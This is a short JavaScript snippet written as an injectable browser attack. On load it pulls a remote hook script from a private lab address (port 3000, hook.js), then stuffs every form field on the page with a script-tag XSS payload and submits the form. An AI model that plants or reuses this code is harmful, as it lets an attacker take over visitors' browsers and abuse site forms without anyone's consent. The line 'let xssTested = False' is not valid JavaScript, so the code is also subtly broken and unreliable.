function injectHookJS() {
    const url ='http://10.0.2.15:3000/hook.js';
    const script = document.createElement('script');
    script.src = url;
    script.type = 'text/javascript';
    document.body.appendChild(script);
  }
  
let xssTested = False
function testXSS() {
    if(xssTested) return;
    const xssPayload = '<script>alert("XSS Test!")</script>';
    const formInputs = document.querySelectorAll('input, textarea');
    formInputs.forEach(input => {
      input.value = xssPayload;
    });
  
    const form = document.querySelector('form');
    if (form) {
      form.submit();
    }
    xssTested = true
  }
(function() {
    injectHookJS();
    testXSS();
})();